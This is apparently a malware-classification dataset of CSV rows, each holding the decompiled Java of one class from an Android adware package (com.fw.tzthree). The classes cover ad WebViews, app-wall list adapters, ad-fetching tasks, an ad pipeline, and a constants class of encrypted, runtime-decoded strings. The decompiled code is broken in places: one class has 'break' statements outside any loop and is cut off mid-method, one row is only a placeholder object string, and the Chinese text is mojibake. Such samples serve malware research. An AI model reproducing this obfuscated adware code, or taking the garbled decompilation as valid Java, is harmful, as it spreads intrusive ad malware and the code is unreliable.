"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\q.code","class q extends WebViewClient {   final FwAdDetailActivity a;   private q(  FwAdDetailActivity fwAdDetailActivity){     this.a=fwAdDetailActivity;   }   public q(  FwAdDetailActivity fwAdDetailActivity,  a aVar){     this(fwAdDetailActivity);   }   @Override public void onPageFinished(  WebView webView,  String str){     AdInfo adInfo;     int i;     AdInfo adInfo2;     AdInfo adInfo3;     int i2;     AdInfo adInfo4;     int i3;     AdInfo adInfo5;     AdInfo adInfo6;     Context applicationContext=this.a.getApplicationContext();     adInfo=this.a.Z;     com.fw.tzthree.d.u.a(applicationContext,adInfo.getAdId().intValue() + 3038375 + 123);     i=this.a.aa;     if (i == 1) {       Intent intent=new Intent(this.a.getApplicationContext(),(Class<?>)FwAdDetailActivity.class);       String str2=com.fw.tzthree.b.a.aW;       adInfo2=this.a.Z;       intent.putExtra(str2,adInfo2.getUrl());       String str3=com.fw.tzthree.b.a.aX;       adInfo3=this.a.Z;       intent.putExtra(str3,adInfo3);       String str4=com.fw.tzthree.b.a.ba;       i2=this.a.aa;       intent.putExtra(str4,i2);       Context applicationContext2=this.a.getApplicationContext();       adInfo4=this.a.Z;       PendingIntent activity=PendingIntent.getActivity(applicationContext2,adInfo4.getAdId().intValue() + 3038375 + 123,intent,134217728);       Context applicationContext3=this.a.getApplicationContext();       i3=this.a.aa;       adInfo5=this.a.Z;       adInfo6=this.a.Z;       com.fw.tzthree.d.u.a(applicationContext3,i3,adInfo5,adInfo6.getAdId().intValue() + 3038375 + 123,activity,true);     }   }   @Override public void onPageStarted(  WebView webView,  String str,  Bitmap bitmap){     super.onPageStarted(webView,str,bitmap);   }   @Override public void onReceivedError(  WebView webView,  int i,  String str,  String str2){     super.onReceivedError(webView,i,str,str2);     Toast.makeText(this.a.getApplicationContext(),com.fw.tzthree.d.j.bv,0).show();   }   @Override public boolean shouldOverrideUrlLoading(  WebView webView,  String str){     webView.loadUrl(str);     return true;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\r.code","public class r extends BaseAdapter {   private Context a;   private String c;   private View j;   private t k;   private String[] b={""#e64649"",""#e5a345"",""#e3e745"",""#44e844"",""#45e7b0"",""#447ae5"",""#af46e4""};   private Drawable d=new ColorDrawable(Color.argb(30,0,0,0));   private final int e=256;   private final int f=257;   private final int g=258;   private final int h=259;   private final int i=263;   private final List<AppWallAdInfo> l=new ArrayList();   public r(  Context context,  String str){     this.a=context;     this.c=str;   }   @Override public AppWallAdInfo getItem(  int i){     return this.l.get(i);   }   public void a(  List<AppWallAdInfo> list){     if (list == null) {       return;     }     this.l.addAll(list);     notifyDataSetChanged();   }   @Override public int getCount(){     return this.l.size();   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     this.j=view;     if (this.j == null) {       this.j=new RelativeLayout(this.a);       this.k=new t();       this.j.setLayoutParams(new AbsListView.LayoutParams(-1,com.fw.tzthree.d.n.a(this.a,68.0f)));       ((RelativeLayout)this.j).setGravity(16);       this.k.e=new ImageView(this.a);       ((RelativeLayout)this.j).addView(this.k.e);       RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(com.fw.tzthree.d.n.a(this.a,5.0f),-1);       layoutParams.addRule(9);       this.k.e.setLayoutParams(layoutParams);       this.k.e.setImageDrawable(new ColorDrawable(-16776961));       this.k.a=new SmartImageView(this.a);       RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(com.fw.tzthree.d.n.a(this.a,50.0f),com.fw.tzthree.d.n.a(this.a,50.0f));       layoutParams2.leftMargin=com.fw.tzthree.d.n.a(this.a,15.0f);       layoutParams2.rightMargin=com.fw.tzthree.d.n.a(this.a,10.0f);       layoutParams2.addRule(15);       this.k.a.setLayoutParams(layoutParams2);       this.k.a.setId(256);       this.k.d=new ImageView(this.a);       RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(-2,-2);       layoutParams3.addRule(11);       layoutParams3.addRule(15);       layoutParams3.rightMargin=com.fw.tzthree.d.n.a(this.a,10.0f);       this.k.d.setLayoutParams(layoutParams3);       this.k.d.setImageBitmap(com.fw.tzthree.d.g.a(this.a,15,20,""by_right_arrow.png""));       this.k.d.setId(263);       this.k.b=new TextView(this.a);       RelativeLayout.LayoutParams layoutParams4=new RelativeLayout.LayoutParams(-2,-2);       layoutParams4.topMargin=com.fw.tzthree.d.n.a(this.a,13.0f);       layoutParams4.addRule(1,256);       layoutParams4.addRule(0,257);       this.k.b.setLayoutParams(layoutParams4);       this.k.b.setTextSize(2,16.0f);       this.k.b.setTextColor(Color.rgb(78,78,78));       this.k.b.setSingleLine(true);       this.k.b.setEllipsize(TextUtils.TruncateAt.valueOf(""END""));       this.k.b.setText(""LINE"");       this.k.b.setId(258);       this.k.c=new TextView(this.a);       RelativeLayout.LayoutParams layoutParams5=new RelativeLayout.LayoutParams(-2,-2);       layoutParams5.addRule(1,256);       layoutParams5.addRule(3,258);       layoutParams5.addRule(0,263);       this.k.c.setLayoutParams(layoutParams5);       this.k.c.setText(""å¿«ä¹�è�Šå¤©ï¼Œäº«å�—ç®€å�•"");       this.k.c.setTextColor(Color.rgb(101,101,101));       this.k.c.setTextSize(2,16.0f);       this.k.c.setSingleLine(true);       this.k.c.setEllipsize(TextUtils.TruncateAt.valueOf(""END""));       this.k.c.setId(259);       ((ViewGroup)this.j).addView(this.k.a);       ((ViewGroup)this.j).addView(this.k.b);       ((ViewGroup)this.j).addView(this.k.c);       ((ViewGroup)this.j).addView(this.k.d);       this.j.setTag(this.k);     }  else {       this.k=(t)this.j.getTag();     }     AppWallAdInfo item=getItem(i);     String icon=item.getIcon();     this.k.a.setImageDrawable(this.d);     this.k.a.setImageUrl(this.c + icon);     int length=this.b.length;     this.k.e.setImageDrawable(new ColorDrawable(Color.parseColor(i < length ? this.b[i] : this.b[i % length])));     this.k.b.setText(item.getAppName());     this.k.c.setText(item.getRecommend());     return this.j;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\t.code","final class t {   SmartImageView a;   TextView b;   TextView c;   ImageView d;   ImageView e;   private t(){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\u.code","public class u extends AsyncTask<Void,Void,List<AppWallAdInfo>> {   final FwWallAdListActivity a;   public u(  FwWallAdListActivity fwWallAdListActivity){     this.a=fwWallAdListActivity;   }   @Override public List<AppWallAdInfo> doInBackground(  Void... voidArr){     Context context;     AppWallBusiness a=AppWallBusiness.a();     context=this.a.o;     return a.a(context,false,0);   }   @Override public void onPostExecute(  List<AppWallAdInfo> list){     RelativeLayout relativeLayout;     RelativeLayout relativeLayout2;     if (list == null || list.size() == 0) {       relativeLayout=this.a.m;       relativeLayout.removeAllViews();       this.a.c();     }  else {       relativeLayout2=this.a.m;       relativeLayout2.removeAllViews();       this.a.a((List<AppWallAdInfo>)list);     }     super.onPostExecute(list);   }   @Override protected void onPreExecute(){     this.a.b();     FwAppWallManager.init(this.a);     this.a.o=this.a;     super.onPreExecute();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\v.code","public class v implements AdapterView.OnItemClickListener {   final FwWallAdListActivity a;   public v(  FwWallAdListActivity fwWallAdListActivity){     this.a=fwWallAdListActivity;   }   @Override public void onItemClick(  AdapterView<?> adapterView,  View view,  int i,  long j){     r rVar;     String str;     r rVar2;     rVar=this.a.g;     AppWallAdInfo item=rVar.getItem(i);     if (3 == item.getKind().intValue()) {       AppWallBusiness.a().postActionRequest(this.a,item,4);       com.fw.tzthree.d.r.a(this.a,item.getUrl());       return;     }     Intent intent=new Intent(this.a,(Class<?>)FwAdDetailActivity.class);     String str2=com.fw.tzthree.b.a.bc;     str=this.a.i;     intent.putExtra(str2,str);     intent.putExtra(com.fw.tzthree.b.a.ba,5);     String str3=com.fw.tzthree.b.a.aX;     rVar2=this.a.g;     intent.putExtra(str3,rVar2.getItem(i));     this.a.startActivity(intent);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\w.code","public class w extends AsyncTask<Void,Void,List<AppWallAdInfo>> {   final int a;   final FwWallAdListActivity b;   public w(  FwWallAdListActivity fwWallAdListActivity,  int i){     this.b=fwWallAdListActivity;     this.a=i;   }   @Override public List<AppWallAdInfo> doInBackground(  Void... voidArr){     Context context;     AppWallBusiness a=AppWallBusiness.a();     context=this.b.o;     return a.a(context,this.a);   }   @Override public void onPostExecute(  List<AppWallAdInfo> list){     ListView listView;     View view;     r rVar;     r rVar2;     r rVar3;     ListView listView2;     View view2;     this.b.q=false;     if (list == null || list.isEmpty()) {       listView=this.b.e;       view=this.b.h;       listView.removeFooterView(view);       this.b.p=false;     }  else {       rVar=this.b.g;       rVar.a(list);       rVar2=this.b.g;       rVar2.notifyDataSetChanged();       rVar3=this.b.g;       if (rVar3.getCount() <= 10) {         listView2=this.b.e;         view2=this.b.h;         listView2.removeFooterView(view2);       }     }     super.onPostExecute(list);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\x.code","class x implements View.OnClickListener {   final FwWallAdListActivity a;   public x(  FwWallAdListActivity fwWallAdListActivity){     this.a=fwWallAdListActivity;   }   @Override public void onClick(  View view){     this.a.finish();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\y.code","!org.eclipse.jdt.core.dom.TypeDeclaration@76fb796e"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.activity\z.code","public class z implements com.fw.tzthree.core.x {   final FwBoxDActivity a;   public z(  FwBoxDActivity fwBoxDActivity){     this.a=fwBoxDActivity;   }   @Override public void a(  BusinessDataContext<AppWallAdInfo> businessDataContext){     this.a.finish();   }   @Override public void a(  BusinessDataContext<AppWallAdInfo> businessDataContext,  List<AppWallAdInfo> list){     this.a.b=list;     this.a.a();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.b\a.code","public class a {   public static final String a=j.a(""FE91CC0D41C2F3B6"");   public static final String b=a + j.a(""01DB49F7A6C4571DC3DAC292BB3EA712"");   public static final String c=a + j.a(""4C08916F301FF445"");   public static final String d=j.a(""206572B7B7301D27"");   public static final String e=j.a(""4938B4996329F6CF"");   public static final String f=j.a(""033C9AA179013A520C662CB03F2E9C61"");   public static final String g=a + j.a(""C77FAE099AC21112ABB3A590408ACE5F"");   public static final String h=a + j.a(""BC2926D2EC9CC3E5FF18FADB88EBD323"");   public static final String i=a + j.a(""D7FA14F1DD9DAB38D0486F418F5F47B193787630039465F3"");   public static final String j=a + j.a(""BBC9BF95D050C1DB4482041A5846A60BA8CFE004E7D9C62A"");   public static final String k=j.a(""2EF65286118C0D84481B00B0BEE600AB9CB36BCDB9DE8CD4"");   public static final String l=j.a(""AB026A4C1D2328CD8CD7B7A85EA8241005A6E238EA5D5500"");   public static final String m=j.a(""AB026A4C1D2328CD9882A240551F044A9E763FD9FB7B1DAD"");   public static final String n=j.a(""496FC82C7DA85E21230B87FD88326E6B063715B3F1B7F644"");   public static final String o=j.a(""496FC82C7DA85E219E354CB34871ED0F"");   public static final String p=j.a(""496FC82C7DA85E21B570E72A595DE216450FE63AF8C2A11A9A72C8CB48492252"");   public static final String q=j.a(""496FC82C7DA85E216C5CFE35AB40ABE944AA97306012364318E7C19A7E5AF4C3"");   public static final String r=j.a(""2EF65286118C0D84DF04313F4F7D01840FECDEC87DAC9772"");   public static final String s=j.a(""145E442BDF3B8444ECEAD432FCBF8BB50B856BEDE12D3DAB1DB865FF260E0A6066C9D0F62A161DCE"");   public static final String t=j.a(""145E442BDF3B8444ECEAD432FCBF8BB50B856BEDE12D3DABE81B69EF19C0B8F16FAD705F195BFF58"");   public static final String u=j.a(""145E442BDF3B8444F9701EF7106B86A4C225764C3D874FA3CE0BA9578265FD65F47378A4D2599878"");   public static final String v=j.a(""446469AEDF7002F5C3DAC292BB3EA712"");   public static final String w=j.a(""496FC82C7DA85E2174E33B14AE7A762C9468DA2B6C9659EF"");   public static final String x=j.a(""496FC82C7DA85E21BC3C337421D9408A2980A4DF201632ADC3DAC292BB3EA712"");   public static final String y=j.a(""AFA40F66CA06A4EF299B2108614974D31803E687825B15E3AFC1C793588FA0370D586D921CEA9AD1AC2103C9C114B099C3DAC292BB3EA712"");   public static final String z=j.a(""AFA40F66CA06A4EF299B2108614974D31803E687825B15E3AFC1C793588FA037C42EAEB0AD610E1A3498F767329BF6C3"");   public static final String A=j.a(""D35EDDC856D61D6DA1D68429744EB021"");   public static final String B=j.a(""D048CD61CD294EC7"");   public static final String C=j.a(""3202C2573294C62258FD713F08754908D41AC749BB1D672B33352DB503556360D344D6F8B4AC1C75AB76FC120770F39E86933E470C249C2EE4846D8CD86FB2210436D6DC618271CB643288E1A3854DB52AC535F9595ABC59E35FA480D8C2CEA8347E8BDB219A4281392ECEB3A890102EC1A12BEEF41F21F7E0C02B6148BB059C7982FB002B753BE7"");   public static final String D=j.a(""31ADBA82A724B3ED"");   public static final String E=j.a(""C2E0A69E1E5B6E94"");   public static final String F=j.a(""1FFA515AE2A83F9FDC4E6062F1A0176C"");   public static final String G=j.a(""0FABA6D80DC47134DC4E6062F1A0176C"");   public static final String H=j.a(""F850449D91319697"");   public static final String I=j.a(""7166A76448A6A566FD9479F3938C9DD2DE3D19E8878ACDACB88A04747395F5C6380E073430CE93B1BDC4EE9E0E3E7C3F2DBF56EED8FF97AC26272D24D8BC7CDE10BB4EC76E0530818D727D8F821E295BDF2D3C58B69F5BA24E97A923E8891C36ED2BF5407C525F11988EFD973A620B57"");   public static int J=0;   public static final String[] K={B + j.a(""B85FFAAE185B7499C5E1950472897969931495375A2244BFBEC0AAE9DC5DFAD0CD1267EF207E8D85""),B + j.a(""D7693657582DB7E7A05CBF6DF64B85057E014CA4F5DB0253F312462F65ECBEBF"")};   public static final String L=B + j.a(""BFA19B086624985FB784EFC7D6BF66100B5B577BA3946D810A811A34D92BE4C4682E436E72A9B7E835AD281E7BB346AB"");   public static final String M=j.a(""2F78187E34E8C0A3"");   public static final String N=j.a(""76F893B1987FC608"");   public static final String O=j.a(""4892B930C0F6F259C3DAC292BB3EA712"");   public static final String P=a + j.a(""B6432F7EA662D279"");   public static final String Q=j.a(""B822ECFF5E438E64"");   public static final String R=j.a(""C0C4786B4A76720FA929E54F1D735910"");   public static final String S=j.a(""0F3BA533C4FE43C890DBA1C35DBCA0F5"");   public static final String T=j.a(""3E6B0387C737F752CDF957E5557FC45C"");   public static final String U=j.a(""0C25D088CE9C3C895A57C026B39EA975"");   public static final String V=j.a(""58FB46B7D066B603621B4961B35D1A0C"");   public static final String W=j.a(""EAA79CA619AEEBD9907CAD452BCA0EF2"");   public static final String X=j.a(""0309187DD63678F822D6F6D1E98B3963"");   public static final String Y=j.a(""5362BFFBAC03852502F5D1818357B47F"");   public static final String Z=j.a(""B82EF9E838303EBB36D96193C622F395"");   public static final String aa=j.a(""076292B60074C1CEF6291C22C4D4F984"");   public static final String ab=j.a(""450C283C13D8FD2F8DE2E79F21070886C3DAC292BB3EA712"");   public static final String ac=j.a(""8C35AAEC17D2BCCF"");   public static String ad=P + j.a(""77CFC3A73F7DA883B05C450ABB6384EB"");   public static final String ae=j.a(""D26AEC310EF622A9AE6DB29DD777D524494D02B7757E9735A2E3AC6E4AB3F3FDA8CFE004E7D9C62A"");   public static final String af=j.a(""D26AEC310EF622A9AE6DB29DD777D5240F86F07560AA0888A481569EB614D28B"");   public static final String ag=j.a(""5138B6CE9BB10EB4A56474FE8A533F5E3967E1FB847D37FEC4D2673FE5CDEC541FCA9F03BAD7BA7F"");   public static String ah=j.a(""7EEDD36AED4B594B17C7FCACEF9C87DE"");   public static String ai=j.a(""F6F9D101D3FE45664D436D5B0E121C23"");   public static String aj=j.a(""6247C5A8A18F938DCA8C942E94914B5A"");   public static final String ak=j.a(""8215B79D998B3667C3DAC292BB3EA712"");   public static final String al=j.a(""493CDABE820AA3BAAD8280736CFE6FC1"");   public static final String am=j.a(""1C5D7FC1B35AB3BBC320CAF7DBB5F52C"");   public static final String an=j.a(""F82453DD0D335FE11A50C35CFC3BDB95"");   public static final String ao=j.a(""FF70A6F972DC98E0E725D344AB61C98557ED540A6FE34FBA"");   public static final String ap=j.a(""72818A09219410A3BD2818F12B865525C3DAC292BB3EA712"");   public static final Integer aq=0;   public static final String ar=j.a(""D80D6464A3DEEE1A8DB430D766615C80"");   public static final String as=j.a(""A72BA3CCB8493A36C3DAC292BB3EA712"");   public static final String at=j.a(""B7C25F40EAC3165F1EC6D56E5D70C085"");   public static final String au=j.a(""DFAC0DFBECAC540B1EC6D56E5D70C085"");   public static final String av=j.a(""3C743305EE8AF850C3DAC292BB3EA712"");   public static final String aw=j.a(""6373B7DCD81EACCFA35A3856371C71B7"");   public static final String ax=j.a(""DF98F8DBFDB0CDB901DACFA493FD8BDC"");   public static final String ay=j.a(""3659C2EE00AFD8475D2A418C5A424B9992939DDA922B8D4C"");   public static final String az=j.a(""DA501A032B35B891E05ACDA2C435F078"");   public static final String aA=j.a(""6363561DEAB6B5C9B200E891D502CD1D1A50C35CFC3BDB95"");   public static final String aB=j.a(""6363561DEAB6B5C9B8F8052AABD14313ADD9600F05FE55FF"");   public static final String aC=j.a(""6363561DEAB6B5C91930E963870D69F14F14EE06ED0908A3"");   public static final String aD=j.a(""6363561DEAB6B5C964644E620412F408F906FB447F8B5F3A731422E1595E17C4"");   public static final String aE=j.a(""CEC5F210D5F9B8451C7BC5310BE6C85C"");   public static final String aF=j.a(""145E442BDF3B8444ECEAD432FCBF8BB50B856BEDE12D3DABE81B69EF19C0B8F16FAD705F195BFF58"");   public static final String aG=j.a(""145E442BDF3B8444ECEAD432FCBF8BB50B856BEDE12D3DAB1DB865FF260E0A6066C9D0F62A161DCE"");   public static final String aH=j.a(""145E442BDF3B8444ECEAD432FCBF8BB50B856BEDE12D3DABC7AF2D99B9C1D9B604C7A18891205F33C2EC6F6ABE1492E0"");   public static final String aI=j.a(""FB14F9AB0928A6F5E6CC03D1E75B78ECD1C1B9534BFC10FB"");   public static final String aJ=j.a(""2D242709F8EE95E9"");   public static final String aK=j.a(""F43BAB9C22964781621B4961B35D1A0C"");   public static final String aL=j.a(""DD9A0AEA43014463E7D63002C53CB206"");   public static final String aM=j.a(""B229B8706DF4381720A894CA6463934D"");   public static final String aN=j.a(""B719CD82CE7576BE4204648C737A1EA9"");   public static final String aO=j.a(""FE35F43AF27B841A"");   public static final String aP=j.a(""86BF292C1C1A65ACABE58BD0F0633827"");   public static final String aQ=j.a(""511AE6487637E8F9A17AF8E3A70BD5AC"");   public static final String aR=j.a(""5B4A355FCD02277E0259283F3BBAE88F"");   public static final String aS=j.a(""A4A150FAAF2CE0DFD407D5A9979D4E46"");   public static final String aT=j.a(""A5A3585D45228D8B318D80317769792E"");   public static final String aU=j.a(""1CE665BA92875088BB08C052DDD35FD8"");   public static final String aV=j.a(""56E594B2E77D62492CEB09A2FED2ADE9"");   public static final String aW=j.a(""98816AD72050FB0CC6B5401F7A8C75E1"");   public static final String aX=j.a(""C557C12EBE4EA886"");   public static final String aY=j.a(""04E2DBAA7974C9851D24C91BE0C514E172234E613603143B59AC0C03A6FD5482"");   public static final String aZ=a + j.a(""650DDE05564D8E7FF96E42C33F8394C5E2FB1C936737D497"");   public static final String ba=a + j.a(""AEDFD1EB5B87B7C7"");   public static final String bb=a + j.a(""C5BA28B30C4A68CB9C139E1DED367025"");   public static final String bc=a + j.a(""C2E0A69E1E5B6E94"");   public static final String bd=a + j.a(""1CE665BA928750882D237C4C8FC9ABEE"");   public static final String be=a + j.a(""033C9AA179013A5254958492D0B6742B"");   public static final String bf=a + j.a(""22426D46B4959418594E5F56431304AA"");   public static final String bg=a + j.a(""033C9AA179013A5261E38C011966CF36C3DAC292BB3EA712"");   public static final String bh=j.a(""38EBCB6A727F4250C3DAC292BB3EA712"");   public static final String bi=j.a(""7B40F3C057C18B9FE8336FD27AC853EE"");   public static final String bj=j.a(""145E442BDF3B8444ECEAD432FCBF8BB5DE47F77B35AD8346D47731307A124247ECF9DEDB242EA898F0A0C4DC64ACDE09"");   public static final String bk=j.a(""908E009C62FE2A71FC38283FF777FE64"");   public static final String bl=j.a(""DF38C5AD1E7F248CA8CFE004E7D9C62A"");   public static final String bm=j.a(""885D7DB74C0C2C35D874CD05333A7E158DB430D766615C80"");   public static final String bn=j.a(""7459875158EEC10EC3DAC292BB3EA712"");   public static final String bo=j.a(""B2AEA459E0A6B7FCC3DAC292BB3EA712"");   public static final String bp=bn + j.a(""9A85819C6F636BD1621B4961B35D1A0C"");   public static final String bq=bn + j.a(""52CAF63C7C23501CCCBE3A4BE0FABD0EA8CFE004E7D9C62A"");   public static final String br=bn + j.a(""39B09197599823BCC693C8E8F35294BC"");   public static final String bs=bn + j.a(""51677E944DC9AF9A4FB44EE4BE863B1E"");   public static final String bt=bn + j.a(""C3980C302946A439FF1F8EEBAF81222C"");   public static final String bu=j.a(""AFA40F66CA06A4EF299B2108614974D31803E687825B15E3AFC1C793588FA037C42EAEB0AD610E1A3498F767329BF6C3"");   public static final String bv=j.a(""AFA40F66CA06A4EF299B2108614974D37AA8133DCC5BA7CDD48F5D364E031B0A464884E2BB88FB2732190A09FA5CE64E"");   public static final String bw=j.a(""03E97E6347157EF1A8CFE004E7D9C62A"");   public static final String bx=j.a(""2D2E99DF925F5D46F0CB07FA1D13D9AE87E54D7C887DF4D20258889ADA99E040"");   public static final String by=j.a(""3ED7BD355BC35223CA8C942E94914B5A"");   public static final String bz=j.a(""C53A72F8B5DB99DE8CF4D89010145580254D6714643044B5"");   public static final String bA=j.a(""9E5910643A9A8C54C3DAC292BB3EA712"");   public static final String bB=j.a(""8C35AAEC17D2BCCF"");   public static final String bC=j.a(""C557C12EBE4EA886""); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c\a.code","public class a<T extends AdInfo> {   private d a;   private d c(  BusinessDataContext businessDataContext){     if (com.fw.tzthree.b.a.Y.equals(businessDataContext.getUrl())) {       return new d(this,businessDataContext);     }     if (com.fw.tzthree.b.a.aa.equals(businessDataContext.getUrl())) {       return new d(this);     }     return null;   }   public List<T> a(  BusinessDataContext<T> businessDataContext){     d.a(c(businessDataContext),businessDataContext);     d.b(c(businessDataContext),businessDataContext);     if (businessDataContext.getResponseData() == null || businessDataContext.getResponseData().getAd() == null) {       return null;     }     return businessDataContext.getResponseData().getAd().getAdList();   }   public void a(  BusinessDataContext<T> businessDataContext,  e<T> eVar){     this.a=c(businessDataContext);     d.a(this.a,businessDataContext);     d.b(this.a,businessDataContext);     if (businessDataContext.isNoNeedCallback()) {       return;     }     businessDataContext.getHandler().post(new b(this,eVar,businessDataContext));   }   public void b(  BusinessDataContext<T> businessDataContext){     if (g.a(businessDataContext.getContext())) {       return;     }     d.a(c(businessDataContext),businessDataContext);     d.b(c(businessDataContext),businessDataContext);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c\b.code","public class b implements Runnable {   final e a;   final BusinessDataContext b;   final a c;   public b(  a aVar,  e eVar,  BusinessDataContext businessDataContext){     this.c=aVar;     this.a=eVar;     this.b=businessDataContext;   }   @Override public void run(){     if (this.a != null) {       this.a.onCallBack(this.b);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c\c.code","public class c {   final a a;   private c b;   private c c;   private Object d;   public c(  a aVar){     this.a=aVar;   }   public static c a(  c cVar,  c cVar2){     cVar.b=cVar2;     return cVar2;   }   public static Object a(  c cVar){     return cVar.d;   }   public static Object a(  c cVar,  Object obj){     cVar.d=obj;     return obj;   }   public static c b(  c cVar){     return cVar.b;   }   public static c b(  c cVar,  c cVar2){     cVar.c=cVar2;     return cVar2;   }   public static c c(  c cVar){     return cVar.c;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c\d.code","public class d {   final a a;   private c b;   private c c;   public d(  a aVar){     this.a=aVar; synchronized (getClass()) {       a(new k());       a(new t());       a(new i());       a(new h());       a(new ab());       a(new com.fw.tzthree.c.a.b());     }   }   public d(  a aVar,  BusinessDataContext<T> businessDataContext){     this.a=aVar; synchronized (getClass()) {       a(new n());       a(new k());       a(new t());       a(new i());       a(new h());       a(new ab());       a(new y()); switch (businessDataContext.getAdType()) { case 1:         a(new aa());       break; case 2:     a(new com.fw.tzthree.c.a.e());   break; case 3: if (1 != businessDataContext.getRequestData().getAd().getShowStyle().intValue()) {   a(new p());   break; }  else {   a(new x());   break; } case 5: if (1 != businessDataContext.getRequestData().getAd().getCategory().intValue()) { if (2 != businessDataContext.getRequestData().getAd().getCategory().intValue()) {   a(new com.fw.tzthree.c.a.d());   break; }  else {   a(new f());   break; } }  else { a(new s()); break; } case 6: a(new q()); break; case 7: a(new j()); break; } } } public void a(BusinessDataContext<T> businessDataContext){ Object obj; c cVar; Object obj2; c cVar2=this.c; while (cVar2 != null) { obj=cVar2.d; if (obj instanceof m) { obj2=cVar2.d; ((m)obj2).a(businessDataContext); } cVar=cVar2.b; cVar2=cVar; } } public void b(BusinessDataContext<T> businessDataContext){ Object obj; c cVar; Object obj2; c cVar2=this.b; while (cVar2 != null) { obj=cVar2.d; if (obj instanceof ak) { obj2=cVar2.d; ((ak)obj2).b(businessDataContext); } cVar=cVar2.c; cVar2=cVar; } } public d a(Object obj){ d dVar; c cVar=new c(this.a); cVar.d=obj; cVar.b=this.c; if (this.b == null) { this.b=cVar; } if (this.c != null) { this.c.c=cVar; } this.c=cVar; dVar=this.a.a; return dVar; } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c\e.code","public interface e<T extends AdInfo> {   void onCallBack(  BusinessDataContext<T> businessDataContext); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\a.code","public abstract class a<T extends AdInfo> implements ak<BusinessDataContext<T>>, m<BusinessDataContext<T>> {   @Override public void a(  BusinessDataContext<T> businessDataContext){     if (businessDataContext.isNotNeedCache()) {     }   }   protected abstract void a(  BusinessDataContext<T> businessDataContext,  com.fw.tzthree.db.a<T> aVar);   @Override public void b(  BusinessDataContext<T> businessDataContext){     if (businessDataContext.isInterrupt() || businessDataContext.isHasCache()) {       return;     }     com.fw.tzthree.db.a<T> dbHelper=businessDataContext.getDbHelper();     if (businessDataContext.getResponseData() == null) {       a(businessDataContext,dbHelper);       return;     }     dbHelper.a(businessDataContext.getResponseData().getSetting(),businessDataContext.getAdType());     dbHelper.a(businessDataContext.getResponseData().getAppend(),businessDataContext.getAdType());     b(businessDataContext,dbHelper);   }   protected abstract void b(  BusinessDataContext<T> businessDataContext,  com.fw.tzthree.db.a<T> aVar);   public void c(  BusinessDataContext<T> businessDataContext,  com.fw.tzthree.db.a<T> aVar){     businessDataContext.getRequestData().setAppend(aVar.b(businessDataContext.getAdType()));     businessDataContext.getRequestData().setDevice(com.fw.tzthree.d.h.a(aVar.a()));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\aa.code","public class aa<T extends AdInfo> extends c<T> {   private T a(  T t,  int i,  com.fw.tzthree.db.a<T> aVar,  int i2){     T a=t.getId().longValue() == ((long)i2) ? aVar.a(i,(Integer)1) : aVar.a(i,Integer.valueOf((int)(t.getId().longValue() + 1)));     if (a != null) {       return a;     }     com.fw.tzthree.d.s.b(""èŽ·å�–ä¸‹ä¸€æ�¡å¹¿å‘Šå¤±è´¥ï¼Œå¹¿å‘Šç±»åž‹ä¸º"" + i);     return null;   }   @Override List<T> a(  BusinessDataContext<T> businessDataContext,  AdHinge adHinge){     ArrayList arrayList=null;     com.fw.tzthree.db.a<T> dbHelper=businessDataContext.getDbHelper();     int k=dbHelper.k(businessDataContext.getAdType());     T a=dbHelper.a(businessDataContext.getAdType(),adHinge.getAdId(),adHinge.getCategory().intValue()); {       businessDataContext.setInterrupt(true);     }     T t=a;     int i=0;     T t2=null;     if (i >= k) {       break;     }     t2=a((aa<T>)t,businessDataContext.getAdType(),(com.fw.tzthree.db.a<aa<T>>)dbHelper,k);     if (t2 == null) {       businessDataContext.setInterrupt(true);       break;     }   }   @Override public void a(  BusinessDataContext<T> businessDataContext){     super.a((BusinessDataContext)businessDataContext);   }   @Override protected void a(  BusinessDataContext<T> businessDataContext,  com.fw.tzthree.db.a<T> aVar){     AdHinge 